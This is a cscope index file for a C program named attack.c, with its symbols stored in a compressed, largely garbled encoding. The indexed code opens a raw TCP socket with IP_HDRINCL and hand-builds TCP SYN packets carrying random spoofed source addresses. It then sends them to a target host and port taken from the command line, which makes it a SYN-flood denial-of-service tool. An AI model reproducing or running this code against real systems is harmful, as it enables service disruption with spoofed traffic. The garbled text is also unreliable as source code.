cscope 15 $HOME/working/program/c/attack -q 0000000082 0000002472
	@attack.c

2 
	~<¡dlib.h
>

3 
	~<¡dio.h
>

4 
	~<”ºo.h
>

5 
	~<¡ršg.h
>

6 
	~<uni¡d.h
>

7 
	~<Ãtdb.h
>

8 
	~<sys/sock‘.h
>

9 
	~<sys/ty³s.h
>

10 
	~<Ãtš‘/š.h
>

11 
	~<Ãtš‘/.h
>

12 
	~<¬·/š‘.h
>

13 
	~<lšux/tı.h
>

16 
©ck
(
skfd
,
sockaddr_š
 *
rg‘
,
¤ıÜt
);

18 
check_sum
(*
addr
,
Ën
);

20 
	$maš
(
¬gc
,** 
¬gv
){

21 
skfd
;

22 
sockaddr_š
 
rg‘
;

23 
ho¡’t
 *
ho¡
;

24 cÚ¡ 
Ú
=1;

25 
¤ıÜt
;

27 if(
¬gc
 < 4)

29 
	`´štf
("U§ge:% rg‘ d¡pÜˆ¤ıÜt\n",
¬gv
[0]);

30 
	`ex™
(1);

33 
	`bz”o
(&
rg‘
,(
sockaddr_š
));

34 
rg‘
.
sš_çmy
=
AF_INET
;

35 
rg‘
.
sš_pÜt
=
	`htÚs
(
	`©oi
(
¬gv
[2]));

37 if(
	`š‘_©Ú
(
¬gv
[1],&
rg‘
.
sš_addr
)==0)

39 
ho¡
=
	`g‘ho¡byÇme
(
¬gv
[1]);

40 if(
ho¡
==
NULL
)

42 
	`´štf
("T¬g‘NamE¼Ü:%s\n",
	`h¡»¼Ü
(
h_”ºo
));

43 
	`ex™
(1);

45 
rg‘
.
sš_addr
=*(
š_addr
 *)(
ho¡
->
h_addr_li¡
[0]);

49 if(0>(
skfd
=
	`sock‘
(
AF_INET
,
SOCK_RAW
,
IPPROTO_TCP
))){

50 
	`³¼Ü
("Create Error");

51 
	`ex™
(1);

55 if(0>
	`£tsockİt
(
skfd
,
IPPROTO_IP
,
IP_HDRINCL
,&
Ú
,(on))){

56 
	`³¼Ü
("IP_HDRINCL failed");

57 
	`ex™
(1);

61 
	`£tuid
(
	`g‘pid
());

62 
¤ıÜt
 = 
	`©oi
(
¬gv
[3]);

63 
	`©ck
(
skfd
,&
rg‘
,
¤ıÜt
);

66 
	}
}

69 
	$©ck
(
skfd
,
sockaddr_š
 *
rg‘
,
¤ıÜt
){

70 
buf
[128]={0};

71 

 *ip;

72 
tıhdr
 *
tı
;

73 
_Ën
;

76 
_Ën
 = (

)+(
tıhdr
);

78 

=(*)
buf
;

80 

->
_v
 = 
IPVERSION
;

81 

->
_hl
 = (ip)>>2;

82 

->
_tos
 = 0;

83 

->
_Ën
 = 
	`htÚs
(ip_len);

84 

->
_id
=0;

85 

->
_off
=0;

86 

->
_‰l
=
MAXTTL
;

87 

->
_p
=
IPPROTO_TCP
;

88 

->
_sum
=0;

89 

->
_d¡
=
rg‘
->
sš_addr
;

92 
tı
 = (
tıhdr
*)(
buf
+(

));

93 
tı
->
sourû
 = 
	`htÚs
(
¤ıÜt
);

94 
tı
->
de¡
 = 
rg‘
->
sš_pÜt
;

95 
tı
->
£q
 = 
	`¿ndom
();

96 
tı
->
doff
 = 5;

97 
tı
->
syn
 = 1;

98 
tı
->
check
 = 0;

102 

->
_¤c
.
s_addr
 = 
	`¿ndom
();

103 
tı
->
check
=
	`check_sum
((*éı,(
tıhdr
));

104 
	`£ndto
(
skfd
,
buf
,
_Ën
,0,(
sockaddr
*)
rg‘
,(
sockaddr_š
));

106 
	}
}

109 
	$check_sum
(*
addr
,
Ën
){

110 
Æeá
=
Ën
;

111 
sum
=0;

112 *
w
=(*)
addr
;

113 
ªsw”
=0;

115 
Æeá
>1)

117 
sum
+=*
w
++;

118 
Æeá
-=2;

120 if(
Æeá
==1)

122 *(*)(&
ªsw”
)=*(*)
w
;

123 
sum
+=
ªsw”
;

126 
sum
=(sum>>16)+(sum&0xffff);

127 
sum
+=(sum>>16);

128 
ªsw”
=~
sum
;

129 (
ªsw”
);

130 
	}
}

	@
1
.
0
1
9
attack.c
